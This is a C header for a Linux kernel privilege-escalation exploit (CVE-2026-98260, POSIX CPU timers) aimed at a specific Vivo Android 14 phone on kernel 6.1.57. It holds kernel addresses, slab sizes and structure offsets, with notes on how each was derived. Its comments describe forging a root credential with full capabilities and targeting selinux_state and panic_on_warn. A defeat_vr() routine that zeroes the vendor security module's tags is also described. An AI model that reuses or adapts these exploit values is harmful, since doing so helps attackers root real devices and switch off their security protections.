/*
 * CVE-2026-98260 - posix cpu timers: 6.1.57 backport target values
 * Kernel: 6.1.57-android14-11-maybe-dirty (Vivo V2352A / PD2352, Android 14)
 * Device: vivo/PD2352 (ro.product.device=PD2352), OriginOS 4, slot _b
 * Image: boot_b.img dump (slot _b) 100663296 B, kernel 36678144 B @4096, base 0xffffffc008000000
 * BTF: vmlinux.btf 5672980 B | vendor_boot.img 100663296 B (vr.ko source)
 *
 * Derivation method per value (see v2352a-6.1.57 evidence):
 *  [BTF]    = vmlinux-6.1.57.btf (parsed: task_struct 0x1500, cred 0xB0, thread_info 48B, tracepoint 72B)
 *  [LIVE]   = timer ids diag on the 6.1.57 device (log.txt 20261109-230933)
 *  [DISASM] = 6.1.57 Image disasm (capstone): bl-site low21 match + call-pattern check,
 *             method validated byte-exact on the 6.1.145 reference Image first
 *  [DECODE] = init_task/init_cred bytes decoded from Image (link-time pointers + shape check),
 *             method validated byte-exact on 6.1.145 (init_task 0xa1dfc00, init_cred 0xa1f24f0)
 *  [STRSCAN]= rodata/data structure scan (ctl_table shape / tracepoint shape),
 *             method validated byte-exact on 6.1.145 first
 *  [CENSUS] = adrp+add bigram census over Image text + ldrb tiebreakers (BTF selinux_state layout),
 *             method validated byte-exact on 6.1.145 (0xa5586a8, same counts 251/53)
 *  [VRKO]   = vendor_boot.img ramdisk (lz4-legacy + cpio newc): lib/modules/vr.ko disasm
 *             (mrs xN,sp_el0 -> ldrb #tagA, ldrb #tagB), flat copy is the loaded one
 *
 * UNVERIFIED ON DEVICE: the exploit run itself (no rooted 6.1.57 run yet).
 * Every static value above is cross-validated by 2+ independent methods.
 */

#ifndef TARGET_H
#define TARGET_H

/* do_timer_create bl kmem_cache_alloc [DISASM: adrp x20 + mov w1,#0xdc0 +
 * ldr x0,[x20,#off] + bl @file 0x19f700 (ret 0x19f704) + cbz; UNIQUE match].
 * Live diag: 16 identical samples req=alloc=0x108 @low21 0x19f704 [LIVE]. */
#define STATIC_TIMER_SITE   0xffffffc00819f704ULL
#define TIMER_SITE_LOW21    0x19f704ULL
#define TIMER_ALLOC         0x108ULL

/* cred struct 176 (0xB0) [BTF]; slab cred_jar 192 + live diag
 * req=0xb8 alloc=0xc0 cnt=3 [LIVE], same as 6.1.124/6.1.145. */
#define CRED_REQ            0xb8ULL
#define CRED_ALLOC          0xc0ULL

/* selinux_state [CENSUS: page 0x243a000 K=0x5b0 n=251 + ldrb K+7/K+9
 * (policycap[4]/[6]) + K+2 neighbor n=53 (initialized); 6.1.145 control gives
 * byte-exact 0xa5586a8 with identical counts 251/53].
 * BTF selinux_state 136B: enforcing@0.
 * panic_on_warn [STRSCAN: kern_table entry {procname->"panic_on_warn",
 * data, maxlen=4, mode=0644}, table context byte-identical to 6.1.145]. */
#define SELINUX_STATE_STATIC  0xffffffc00a43a5b0ULL
#define PANIC_ON_WARN_STATIC  0xffffffc00a0cae10ULL
#define CRED_UID_OFF          0x4ULL                /* [BTF] */

/* task_struct / cred layout [BTF] */
#define OFF_TASK_CRED       0x838ULL
/* dup_task_struct bl kmem_cache_alloc_node [DISASM: adrp x25 + mov w1,#0xcc0 +
 * mov w2 + ldr x0,[x25,#0x618] + bl @file 0xafa44 (ret 0xafa48); pattern-picked
 * 1 of 2 low21 hits, same disambiguation as 6.1.145].
 * Live diag single sample req=alloc=0x1500 @low21 0xafa48 [LIVE]. */
#define COPY_PROCESS_LOW21  0xafa48ULL
#define TASK_ALLOC_BYTES    0x1500ULL
#define FULLCAP             0x1ffffffffffULL

/* Link-time symbols for the fake cred's refcounted sub-objects [DECODE @init_cred:
 * init_task@0xa0df180 via swapper-anchor (comm@2120 + self-ref tasks + cred==real),
 * init_cred@0xa0f2f90 shape-checked (usage=4, uids=0, FULL caps, sec=NULL).
 * INIT_USER_NS independently confirmed by [CENSUS] (page 0x20f1000 K=0x9c8). */
#define ROOT_USER_STATIC    0xffffffc00a0f1c60ULL
#define INIT_USER_NS_STATIC 0xffffffc00a0f19c8ULL
#define INIT_UCOUNTS_STATIC 0xffffffc00a0f3518ULL
#define INIT_GROUPS_STATIC  0xffffffc00a0f2f88ULL
#define SELINUX_BLOB_OFF    0x0ULL
#define SELINUX_SID_KERNEL  1U

/* vivo vr.ko per-task tag [VRKO]: flat lib/modules/vr.ko (LOADED one, sha d7dfb438...)
 * marks tagA=0x04/tagB=0x2c; versioned lib/modules/6.1-gki/vr.ko marks 0x06/0x2c
 * (same split as the KSuRoot 3-family finding: 6.1 flat = 0x04).
 * defeat_vr() zeroes whole words task+0x00 (covers 0x04 AND 0x06) and task+0x28
 * (covers 0x2c), so both copies are neutralized; these macros stay documentary. */
#define VR_TAG_A_OFF        0x04ULL
#define VR_TAG_B_OFF        0x2cULL

/* __tracepoint_sys_exit [STRSCAN: 72B struct {name->"sys_exit", key=0,
 * protos, 3 text ptrs, funcs NULL} + next='ipi_raise'; single hit, 6.1.145
 * control gives byte-exact 0xa3cb2c0].
 * TRACEPOINT_FUNCS_OFF [BTF]. */
#define TP_SYS_EXIT_STATIC   0xffffffc00a2b2760ULL
#define TRACEPOINT_FUNCS_OFF 0x40ULL

#endif /* TARGET_H */
